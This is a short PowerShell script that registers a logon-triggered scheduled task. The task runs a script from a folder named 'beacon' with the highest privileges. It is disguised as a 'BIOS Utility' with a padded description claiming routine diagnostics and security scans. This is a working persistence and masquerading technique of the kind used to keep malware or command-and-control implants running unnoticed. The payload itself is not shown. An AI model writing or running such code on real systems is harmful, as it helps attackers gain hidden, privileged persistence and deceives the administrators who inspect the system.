$scriptPath = "C:\temp\beacon\run.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS Utility" -Description "This crucial scheduled task orchestrates a systematic verification and optimization process, ensuring the integrity and optimal performance of the system by executing routine diagnostics, security scans, and performance enhancements at specified intervals." -RunLevel Highest -Force